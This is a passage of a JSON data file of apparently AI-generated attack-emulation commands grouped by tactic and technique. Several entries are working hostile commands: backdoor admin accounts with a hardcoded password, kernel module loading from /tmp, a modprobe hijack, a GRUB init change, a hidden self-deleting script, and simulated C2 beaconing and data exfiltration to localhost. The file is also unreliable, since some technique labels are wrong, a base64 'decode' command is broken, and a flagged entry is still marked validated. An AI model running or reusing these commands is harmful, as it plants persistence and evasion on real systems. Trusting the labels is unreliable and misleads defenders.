      "validated": true
    },
    {
      "id": "2b1deb71-aa3c-4963-93f3-47fd4f5cac11",
      "ttp_id": "95c8f924-aeb5-4147-994f-dcd5c6b78c64",
      "technique_id": "95c8f924-aeb5-4147-994f-dcd5c6b78c64",
      "technique_name": "PowerShell",
      "tactic": "Execution",
      "platform": "windows",
      "command": "powershell -Command \"Get-Process\"",
      "description": "Basic command to list all running processes using PowerShell.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Lists all running processes in the console.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:38:19.088067",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.684,
      "validated": true
    },
    {
      "id": "caa375b8-cb9d-4ae4-834c-d654603e1829",
      "ttp_id": "95c8f924-aeb5-4147-994f-dcd5c6b78c64",
      "technique_id": "95c8f924-aeb5-4147-994f-dcd5c6b78c64",
      "technique_name": "PowerShell",
      "tactic": "Execution",
      "platform": "windows",
      "command": "powershell -Command \"Add-Type -AssemblyName System.Diagnostics; [Diagnostics.Process]::Start('cmd.exe', '/c echo Hello World')\"",
      "description": "Intermediate command that uses PowerShell to start a new process, demonstrating the use of .NET types in PowerShell. However, this command violates the .NET Reflection constraint and should be revised.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Starts a new cmd.exe process that outputs 'Hello World'.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:38:19.088067",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.684,
      "validated": true
    },
    {
      "id": "2eb307de-b3b7-4548-ae89-8077bab51c0c",
      "ttp_id": "95c8f924-aeb5-4147-994f-dcd5c6b78c64",
      "technique_id": "95c8f924-aeb5-4147-994f-dcd5c6b78c64",
      "technique_name": "PowerShell",
      "tactic": "Execution",
      "platform": "windows",
      "command": "powershell -Command \"Start-Process cmd -ArgumentList '/c echo This is a test'\"",
      "description": "Advanced command that safely uses PowerShell to start a new process with arguments, adhering to the constraints.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Starts a new cmd.exe process that outputs 'This is a test'.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:38:19.088067",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.684,
      "validated": true
    },
    {
      "id": "12d9077f-b790-4404-ae16-0925bbeb07e4",
      "ttp_id": "95c8f924-aeb5-4147-994f-dcd5c6b78c64",
      "technique_id": "95c8f924-aeb5-4147-994f-dcd5c6b78c64",
      "technique_name": "PowerShell",
      "tactic": "Execution",
      "platform": "linux",
      "command": "powershell -Command \"Write-Output 'PowerShell test execution on Linux' | Out-File -FilePath $env:TEMP/test_ps_output.txt\"",
      "description": "Basic PowerShell command to write a test string to a file in the temporary directory",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a file named test_ps_output.txt in the user's temp directory with the content 'PowerShell test execution on Linux'. No elevated privileges required. Command executes silently.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:39:28.318192",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.684,
      "validated": true
    },
    {
      "id": "80c42be2-3348-4f38-bf5e-0394cbf86ffd",
      "ttp_id": "95c8f924-aeb5-4147-994f-dcd5c6b78c64",
      "technique_id": "95c8f924-aeb5-4147-994f-dcd5c6b78c64",
      "technique_name": "PowerShell",
      "tactic": "Execution",
      "platform": "linux",
      "command": "powershell -Command \"try { $content = (Invoke-WebRequest -Uri 'http://127.0.0.1:8000/payload.txt' -TimeoutSec 5).Content } catch { $content = 'Fallback test content' }; Set-Content -Path $env:TEMP/fetched_payload.txt -Value $content -Force \"",
      "description": "Intermediate command that attempts to fetch content from a local web server, falling back to a benign string if unavailable",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Tries to download content from http://127.0.0.1:8000/payload.txt. If unreachable, assigns a fallback string. Saves result to fetched_payload.txt in temp. Uses -Force only with Set-Content. No actual payload is harmful.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:39:28.318192",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.684,
      "validated": true
    },
    {
      "id": "b6512bcf-0518-4a52-b180-f4e8e8d69548",
      "ttp_id": "95c8f924-aeb5-4147-994f-dcd5c6b78c64",
      "technique_id": "95c8f924-aeb5-4147-994f-dcd5c6b78c64",
      "technique_name": "PowerShell",
      "tactic": "Execution",
      "platform": "linux",
      "command": "powershell -Command \"mkdir '$env:TEMP/ps_module_test' -ErrorAction SilentlyContinue; $moduleContent = 'function Get-TestOutput { return ''Test from fake module'' }'; Set-Content -Path $env:TEMP/ps_module_test/evilmodule.psm1 -Value $moduleContent -Force; Import-Module '$env:TEMP/ps_module_test/evilmodule.psm1'; Get-TestOutput \"",
      "description": "Advanced command simulating malicious module loading by creating and importing a custom PowerShell module",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a directory in temp, writes a simple PowerShell module file, imports it, and executes a function. Demonstrates module import and execution. Uses -Force only for Set-Content. Directory creation uses error suppression to avoid failure if dir exists.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:39:28.318192",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.684,
      "validated": true
    },
    {
      "id": "4f44546d-0de9-48da-8ba2-5718e7604f34",
      "ttp_id": "1b97c56d-3222-4fb2-bf79-c8dbcbb56636",
      "technique_id": "1b97c56d-3222-4fb2-bf79-c8dbcbb56636",
      "technique_name": "User Execution",
      "tactic": "Execution",
      "platform": "linux",
      "command": "cp /usr/bin/ls $HOME/syn && LD_PRELOAD=$HOME/newdev.so $HOME/syn",
      "description": "Copy 'ls' to 'syn' and execute it with a preloaded shared library to simulate side-loading.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "The 'ls' command executes normally but loads newdev.so from the current directory due to LD_PRELOAD. The .so file would need to be present to have any effect; otherwise, execution proceeds normally.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:48:31.575354",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.683,
      "validated": true
    },
    {
      "id": "2ff90214-c507-4150-8a90-84765ed0992c",
      "ttp_id": "a1023125-5738-4b64-8f4f-f49d15b56323",
      "technique_id": "a1023125-5738-4b64-8f4f-f49d15b56323",
      "technique_name": "Credential Dumping",
      "tactic": "Credential Access",
      "platform": "windows",
      "command": "net user MileSt0ne2 MileSt0ne2@16 /add",
      "description": "Add a new user with a hardcoded password using net.exe",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "A new user will be created with the specified password",
      "source": "langchain",
      "generated_at": "2025-12-28T12:34:38.935287",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.68,
      "validated": true
    },
    {
      "id": "172f0b19-233c-446a-88f0-a9aa4addded9",
      "ttp_id": "a1023125-5738-4b64-8f4f-f49d15b56323",
      "technique_id": "a1023125-5738-4b64-8f4f-f49d15b56323",
      "technique_name": "Credential Dumping",
      "tactic": "Credential Access",
      "platform": "windows",
      "command": "net localgroup administrators MileSt0ne2 /add",
      "description": "Add the new user to the administrators group using net.exe",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "The new user will be added to the administrators group",
      "source": "langchain",
      "generated_at": "2025-12-28T12:34:38.935287",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.68,
      "validated": true
    },
    {
      "id": "b882a2e4-3c08-45f9-bd0d-2c3fb0a6b9f3",
      "ttp_id": "a1023125-5738-4b64-8f4f-f49d15b56323",
      "technique_id": "a1023125-5738-4b64-8f4f-f49d15b56323",
      "technique_name": "Credential Dumping",
      "tactic": "Credential Access",
      "platform": "windows",
      "command": "powershell -Command \"New-LocalUser -Name MileSt0ne2 -Password (ConvertTo-SecureString -String 'MileSt0ne2@16' -AsPlainText -Force) -AccountNeverExpires -PasswordNeverExpires; Add-LocalGroupMember -Group 'Administrators' -Member MileSt0ne2\"",
      "description": "Add a new user with a hardcoded password and add to administrators group using PowerShell",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "A new user will be created with the specified password and added to the administrators group",
      "source": "langchain",
      "generated_at": "2025-12-28T12:34:38.935287",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.68,
      "validated": true
    },
    {
      "id": "b4da5c25-8f0b-402b-ab28-886bab65c081",
      "ttp_id": "a1023125-5738-4b64-8f4f-f49d15b56323",
      "technique_id": "a1023125-5738-4b64-8f4f-f49d15b56323",
      "technique_name": "Credential Dumping",
      "tactic": "Credential Access",
      "platform": "linux",
      "command": "useradd -m newuser && echo 'newuser:MileSt0ne2@16' | chpasswd",
      "description": "Create a new user with a hardcoded password",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "A new user named 'newuser' is created with the password 'MileSt0ne2@16'",
      "source": "langchain",
      "generated_at": "2025-12-28T12:34:39.769924",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.68,
      "validated": true
    },
    {
      "id": "47133072-5a96-4757-b2bc-4e439aebfb64",
      "ttp_id": "a1023125-5738-4b64-8f4f-f49d15b56323",
      "technique_id": "a1023125-5738-4b64-8f4f-f49d15b56323",
      "technique_name": "Credential Dumping",
      "tactic": "Credential Access",
      "platform": "linux",
      "command": "openssl passwd -1 MileSt0ne2@16 > password.txt && useradd -m newuser && usermod -p $(cat password.txt) newuser",
      "description": "Create a new user with an encrypted password using openssl",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "A new user named 'newuser' is created with the encrypted password 'MileSt0ne2@16'",
      "source": "langchain",
      "generated_at": "2025-12-28T12:34:39.769924",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.68,
      "validated": true
    },
    {
      "id": "87cf7a54-8ccf-4647-a91d-e4dba7658bc1",
      "ttp_id": "a1023125-5738-4b64-8f4f-f49d15b56323",
      "technique_id": "a1023125-5738-4b64-8f4f-f49d15b56323",
      "technique_name": "Credential Dumping",
      "tactic": "Credential Access",
      "platform": "linux",
      "command": "echo 'newuser:MileSt0ne2@16' | chpasswd",
      "description": "Change the password of an existing user to the hardcoded password",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "The password of the user 'newuser' is changed to 'MileSt0ne2@16'",
      "source": "langchain",
      "generated_at": "2025-12-28T12:34:39.770243",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.68,
      "validated": true
    },
    {
      "id": "41e79ec9-479d-47bc-83d8-866ac611b50a",
      "ttp_id": "166f7e3f-bae4-4888-9cc3-d189198b635f",
      "technique_id": "166f7e3f-bae4-4888-9cc3-d189198b635f",
      "technique_name": "Phishing",
      "tactic": "Initial Access",
      "platform": "linux",
      "command": "sudo insmod /tmp/nvidiafb.ko",
      "description": "Load a malicious kernel module disguised as a legitimate NVIDIA framebuffer driver.",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "The kernel attempts to load the module 'nvidiafb.ko' from /tmp. If the module is valid and signed appropriately, it will be loaded into kernel space. This simulates abuse of trusted signing certificates from hardware vendors.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:51:10.794587",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.68,
      "validated": true
    },
    {
      "id": "bafa431f-ec0a-47da-a0e5-9f0e5d8c7b31",
      "ttp_id": "166f7e3f-bae4-4888-9cc3-d189198b635f",
      "technique_id": "166f7e3f-bae4-4888-9cc3-d189198b635f",
      "technique_name": "Phishing",
      "tactic": "Initial Access",
      "platform": "linux",
      "command": "echo 'malicious_driver_content' > /tmp/signed_driver_realtek.ko && chmod 644 /tmp/signed_driver_realtek.ko && sudo insmod /tmp/signed_driver_realtek.ko 2>/dev/null || echo 'Module loading failed or blocked by signature verification'",
      "description": "Create a fake Realtek-signed kernel module and attempt to load it, simulating bypass of signature checks or use of compromised certificate.",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "Generates a dummy file named as a Realtek-signed driver, sets permissions, and attempts to load it. Failure is expected on secure systems due to signature enforcement, but success would indicate vulnerable configuration.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:51:10.795099",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.68,
      "validated": true
    },
    {
      "id": "61ebb817-5f4b-455d-acb6-9403d43809a1",
      "ttp_id": "fe2e23c2-9de9-47de-8287-20fc960be7ad",
      "technique_id": "fe2e23c2-9de9-47de-8287-20fc960be7ad",
      "technique_name": "Pre-OS Boot",
      "tactic": "Persistence",
      "platform": "windows",
      "command": "cmd.exe /c copy /y \"%WINDIR%\\system32\\ntoskrnl.exe\" \"%TEMP%\\ntkrnl_mock.sys\"",
      "description": "Simulates copying a system kernel file to a temporary location for potential manipulation (mocking DKOM preparation)",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "Copies ntoskrnl.exe to the temp directory as ntkrnl_mock.sys. This is a benign simulation of accessing kernel components. Requires admin to access system files.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:44:47.618209",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.67,
      "validated": true
    },
    {
      "id": "8e5cce28-72eb-4962-bea3-ede60953f155",
      "ttp_id": "fe2e23c2-9de9-47de-8287-20fc960be7ad",
      "technique_id": "fe2e23c2-9de9-47de-8287-20fc960be7ad",
      "technique_name": "Pre-OS Boot",
      "tactic": "Persistence",
      "platform": "windows",
      "command": "sc.exe create MockDriver binPath= \"%TEMP%\\ntkrnl_mock.sys\" type= kernel start= auto",
      "description": "Creates a mock kernel driver service to simulate a boot-persistent rootkit installation",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "Registers a service named 'MockDriver' set to load at boot as a kernel driver. The binary does not exist or is not a real driver, so it will fail to load, but the service creation is detectable.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:44:47.618209",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.67,
      "validated": true
    },
    {
      "id": "5ac72bfd-db06-45cb-ad7a-10d954bcc329",
      "ttp_id": "fe2e23c2-9de9-47de-8287-20fc960be7ad",
      "technique_id": "fe2e23c2-9de9-47de-8287-20fc960be7ad",
      "technique_name": "Pre-OS Boot",
      "tactic": "Persistence",
      "platform": "windows",
      "command": "powershell -Command \"mkdir 'C:\\\\TempDriver' -ErrorAction SilentlyContinue; Copy-Item -Path '%TEMP%\\\\ntkrnl_mock.sys' -Destination 'C:\\\\TempDriver\\\\driver.sys' -Force\"",
      "description": "Creates a directory in root and copies mock driver to simulate placement of a malicious kernel module",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "Creates C:\\TempDriver and copies the mock driver file. This simulates placement of a kernel-mode component in a location that could be used for boot persistence.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:44:47.618209",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.67,
      "validated": true
    },
    {
      "id": "a86496cd-c866-4fe7-8537-18201d5f78d1",
      "ttp_id": "fe2e23c2-9de9-47de-8287-20fc960be7ad",
      "technique_id": "fe2e23c2-9de9-47de-8287-20fc960be7ad",
      "technique_name": "Pre-OS Boot",
      "tactic": "Persistence",
      "platform": "linux",
      "command": "sudo cp /boot/grub/grub.cfg $HOME/grub.cfg.bak && echo 'set custom_cmdline=\"init=/bin/bash\"' | sudo tee -a /boot/grub/grubenv",
      "description": "Modifies GRUB environment to inject custom boot parameters, simulating a boot persistence mechanism.",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "Backs up grub.cfg and appends a custom command line to grubenv. This could be abused to alter boot behavior, such as starting a custom init process. Requires reboot to take effect.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:45:46.089892",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.67,
      "validated": true
    },
    {
      "id": "43720e8d-c18f-44d0-bc43-61084b45de3d",
      "ttp_id": "fe2e23c2-9de9-47de-8287-20fc960be7ad",
      "technique_id": "fe2e23c2-9de9-47de-8287-20fc960be7ad",
      "technique_name": "Pre-OS Boot",
      "tactic": "Persistence",
      "platform": "linux",
      "command": "sudo dd if=/dev/zero of=$HOME/fake_vmlinuz bs=1024 count=1024 && sudo sysctl -w kernel.modprobe=/home/$USER/fake_vmlinuz",
      "description": "Simulates kernel object manipulation by redirecting modprobe to a fake binary, which could be used to execute code during kernel module loading events at boot.",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "Creates a dummy file to simulate a malicious kernel image and configures the kernel to use it as the modprobe handler. Any attempt to load a module will execute this file. This persists until reboot or sysctl reset.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:45:46.090901",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.67,
      "validated": true
    },
    {
      "id": "033a0947-8de5-45f0-8b1b-c042ee8ff194",
      "ttp_id": "6e4b9274-bfd0-4c5a-a9c5-1ea84e7a62b8",
      "technique_id": "6e4b9274-bfd0-4c5a-a9c5-1ea84e7a62b8",
      "technique_name": "Indicator Removal on Host",
      "tactic": "Defense Evasion",
      "platform": "windows",
      "command": "cmd.exe /c \"echo test payload > %TEMP%\\debug.log && del %TEMP%\\debug.log\"",
      "description": "Creates a temporary log file and deletes it using legacy cmd.exe commands",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A file named debug.log is created in the user's temp directory and immediately deleted. No residual data remains.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:39:28.313618",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.665,
      "validated": true
    },
    {
      "id": "f844bb96-42eb-40fb-8052-fa976b380908",
      "ttp_id": "6e4b9274-bfd0-4c5a-a9c5-1ea84e7a62b8",
      "technique_id": "6e4b9274-bfd0-4c5a-a9c5-1ea84e7a62b8",
      "technique_name": "Indicator Removal on Host",
      "tactic": "Defense Evasion",
      "platform": "windows",
      "command": "powershell -Command \"Compress-Archive -Path $env:TEMP\\debug.txt -DestinationPath $env:TEMP\\archive.zip -Force -ErrorAction SilentlyContinue; Remove-Item $env:TEMP\\debug.txt -Force -ErrorAction SilentlyContinue\"",
      "description": "Archives and removes a local file using PowerShell with forced deletion and error suppression",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "If debug.txt exists in temp, it is added to archive.zip and then deleted. If the file does not exist, the command proceeds silently.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:39:28.313618",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.665,
      "validated": true
    },
    {
      "id": "90cf0324-f27f-473c-b072-d21bdeb2a1fc",
      "ttp_id": "6e4b9274-bfd0-4c5a-a9c5-1ea84e7a62b8",
      "technique_id": "6e4b9274-bfd0-4c5a-a9c5-1ea84e7a62b8",
      "technique_name": "Indicator Removal on Host",
      "tactic": "Defense Evasion",
      "platform": "windows",
      "command": "powershell -Command \"Set-Content -Path $env:TEMP\\malproc.bat -Value 'echo running && ping 127.0.0.1 -n 3 > nul && del %TEMP%\\malproc.bat' -Force; Start-Process $env:TEMP\\malproc.bat -WindowStyle Hidden\"",
      "description": "Creates a self-deleting batch script that executes and removes itself after completion",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "A batch file is created in temp, executed in a hidden window, runs a benign echo and delay, then deletes itself. The file is removed post-execution.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:39:28.313618",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.665,
      "validated": true
    },
    {
      "id": "f7bfe3f5-2b23-4596-a7b6-48a2e57852ea",
      "ttp_id": "6e4b9274-bfd0-4c5a-a9c5-1ea84e7a62b8",
      "technique_id": "6e4b9274-bfd0-4c5a-a9c5-1ea84e7a62b8",
      "technique_name": "Indicator Removal on Host",
      "tactic": "Defense Evasion",
      "platform": "linux",
      "command": "rm /tmp/malicious_artifact.log",
      "description": "Basic deletion of a temporary malicious log file after use",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Deletes the file '/tmp/malicious_artifact.log' if it exists; produces an error if the file is missing",
      "source": "langchain",
      "generated_at": "2025-12-28T12:43:36.847142",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.665,
      "validated": true
    },
    {
      "id": "da048fd5-19fb-435e-ac2c-52be54c72b62",
      "ttp_id": "6e4b9274-bfd0-4c5a-a9c5-1ea84e7a62b8",
      "technique_id": "6e4b9274-bfd0-4c5a-a9c5-1ea84e7a62b8",
      "technique_name": "Indicator Removal on Host",
      "tactic": "Defense Evasion",
      "platform": "linux",
      "command": "rm -f /tmp/staged_payload.b64 2>/dev/null || true",
      "description": "Intermediate deletion with force flag and suppressed errors",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Attempts to delete '/tmp/staged_payload.b64' silently; continues execution regardless of success or failure",
      "source": "langchain",
      "generated_at": "2025-12-28T12:43:36.848152",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.665,
      "validated": true
    },
    {
      "id": "0a494f92-a906-49bc-ba5d-8906b4a44852",
      "ttp_id": "6e4b9274-bfd0-4c5a-a9c5-1ea84e7a62b8",
      "technique_id": "6e4b9274-bfd0-4c5a-a9c5-1ea84e7a62b8",
      "technique_name": "Indicator Removal on Host",
      "tactic": "Defense Evasion",
      "platform": "linux",
      "command": "eval $(echo \"rm -f /tmp/debug_trace.* 2>/dev/null\")",
      "description": "Advanced obfuscated cleanup command removing multiple temporary trace files",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Decodes and executes a command to remove all files matching '/tmp/debug_trace.*' with error suppression; simulates post-execution artifact wiping",
      "source": "langchain",
      "generated_at": "2025-12-28T12:43:36.848152",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.665,
      "validated": true
    },
    {
      "id": "eed6984b-fca7-476a-97e7-bdc6e3ebd5e5",
      "ttp_id": "66be8c2b-305d-40a2-ba24-8af3a7d56742",
      "technique_id": "66be8c2b-305d-40a2-ba24-8af3a7d56742",
      "technique_name": "Create or Modify System Process",
      "tactic": "Persistence",
      "platform": "linux",
      "command": "echo '@reboot echo \"Test persistence via cron\" >> /tmp/persistence_test.log' | crontab -",
      "description": "Adds a cron job for the current user to execute a command at reboot",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A user-specific cron job is installed that appends a test message to /tmp/persistence_test.log upon system reboot. No elevated privileges are needed as it uses user crontab.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:48:31.572798",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.64,
      "validated": true
    },
    {
      "id": "7b228809-859b-4a21-8a40-6f34566f4766",
      "ttp_id": "b6c248b5-b539-4c59-befd-3cbaec014427",
      "technique_id": "b6c248b5-b539-4c59-befd-3cbaec014427",
      "technique_name": "Application Layer Protocol",
      "tactic": "Command And Control",
      "platform": "linux",
      "command": "curl -X GET http://127.0.0.1:8080/status -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64)' --output /tmp/response.txt",
      "description": "Basic HTTP GET request to simulate beaconing to a C2 server using curl",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Sends a GET request to localhost:8080, saves response to /tmp/response.txt. Fails silently if server is unreachable.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:48:31.575354",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.633,
      "validated": true
    },
    {
      "id": "f60597d1-6334-4440-8fc8-1c3422f44334",
      "ttp_id": "b6c248b5-b539-4c59-befd-3cbaec014427",
      "technique_id": "b6c248b5-b539-4c59-befd-3cbaec014427",
      "technique_name": "Application Layer Protocol",
      "tactic": "Command And Control",
      "platform": "linux",
      "command": "echo 'beacon=1&sysinfo=$(uname -a)' | curl -X POST http://127.0.0.1:8080/data -H 'Content-Type: application/x-www-form-urlencoded' --data @-",
      "description": "Intermediate: Sends system information via POST request to simulate data exfiltration",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Executes uname -a, sends output in URL-encoded POST body to localhost:8080/data. Simulates data exfiltration over HTTP.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:48:31.575354",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.633,
      "validated": true
    },
    {
      "id": "89a2ec51-b740-4e04-b269-6cdeefec120b",
      "ttp_id": "b6c248b5-b539-4c59-befd-3cbaec014427",
      "technique_id": "b6c248b5-b539-4c59-befd-3cbaec014427",
      "technique_name": "Application Layer Protocol",
      "tactic": "Command And Control",
      "platform": "linux",
      "command": "bash -c \"$(echo 'curl -s https://127.0.0.1:443/cmd -k' | base64 -d)\" 2>/dev/null || echo 'Command failed' > /dev/null",
      "description": "Advanced: Executes a base64-encoded curl command over HTTPS with error suppression to simulate stealthy C2 interaction",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Decodes and executes a curl command to fetch commands from HTTPS endpoint. Uses -k to bypass certificate checks, simulates encrypted C2. Errors are suppressed.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:48:31.575354",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.633,
      "validated": true
    },
    {
      "id": "16f43c44-a95d-48ff-bafc-564dbd63f612",
      "ttp_id": "aafd1eaa-c5f2-467a-a060-55823500ccd5",
      "technique_id": "aafd1eaa-c5f2-467a-a060-55823500ccd5",
      "technique_name": "Archive Collected Data",
      "tactic": "Collection",
      "platform": "windows",
      "command": "powershell -Command \"Compress-Archive -Path %TEMP%\\test.txt -DestinationPath %TEMP%\\archive.zip -Force\"",
      "description": "Basic archiving using Compress-Archive cmdlet",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a zip archive of a test file in the temp directory",
      "source": "langchain",
      "generated_at": "2025-12-28T12:38:19.088067",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.628,
      "validated": true
    },
    {
      "id": "8c8cc212-5b24-4f7a-b9d1-e094da118f5b",
      "ttp_id": "aafd1eaa-c5f2-467a-a060-55823500ccd5",
      "technique_id": "aafd1eaa-c5f2-467a-a060-55823500ccd5",
      "technique_name": "Archive Collected Data",
      "tactic": "Collection",
      "platform": "windows",
      "command": "powershell -Command \"Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::CreateFromDirectory('%TEMP%\\collect', '%TEMP%\\collect.zip')\"",
      "description": "Intermediate archiving using .NET compression assembly",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a zip archive of a directory named 'collect' in the temp directory using .NET compression",
      "source": "langchain",
      "generated_at": "2025-12-28T12:38:19.088067",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.628,
      "validated": true
    },
    {
      "id": "37960641-bb44-493d-b8c9-192eeb98f759",
      "ttp_id": "aafd1eaa-c5f2-467a-a060-55823500ccd5",
      "technique_id": "aafd1eaa-c5f2-467a-a060-55823500ccd5",
      "technique_name": "Archive Collected Data",
      "tactic": "Collection",
      "platform": "windows",
      "command": "powershell -Command \"mkdir %TEMP%\\archived -ErrorAction SilentlyContinue; Compress-Archive -Path %TEMP%\\test.txt -DestinationPath %TEMP%\\archived\\archive.zip -Force; Remove-Item %TEMP%\\test.txt -ErrorAction SilentlyContinue\"",
      "description": "Advanced archiving with directory creation, compression, and cleanup",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a directory for archives, compresses a test file into it, and then cleans up the original file",
      "source": "langchain",
      "generated_at": "2025-12-28T12:38:19.088067",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.628,
      "validated": true
    },
    {
      "id": "f1dea9d5-61bb-4ca2-8f72-cbc7b4c49693",
      "ttp_id": "aafd1eaa-c5f2-467a-a060-55823500ccd5",
      "technique_id": "aafd1eaa-c5f2-467a-a060-55823500ccd5",
      "technique_name": "Archive Collected Data",
      "tactic": "Collection",
      "platform": "linux",
      "command": "tar -czf $HOME/collected_data.tar.gz -C $HOME/Documents .",
      "description": "Basic archiving of user documents into a gzipped tarball",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a compressed archive named collected_data.tar.gz in the user's home directory containing all files from the Documents folder",
      "source": "langchain",
      "generated_at": "2025-12-28T12:39:28.312604",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.628,
      "validated": true
    },
    {
      "id": "7f2d399c-3af7-42ad-89f7-410c45fef637",
      "ttp_id": "aafd1eaa-c5f2-467a-a060-55823500ccd5",
      "technique_id": "aafd1eaa-c5f2-467a-a060-55823500ccd5",
      "technique_name": "Archive Collected Data",
      "tactic": "Collection",
      "platform": "linux",
      "command": "find $HOME/Downloads -type f -name '*.pdf' -o -name '*.docx' | zip $HOME/artifacts.zip -@",
      "description": "Intermediate: Archives specific file types (PDF and DOCX) from Downloads into a ZIP file using stdin",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Finds PDF and DOCX files in the Downloads directory and packages them into artifacts.zip using zip's stdin input mode",
      "source": "langchain",
      "generated_at": "2025-12-28T12:39:28.312604",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
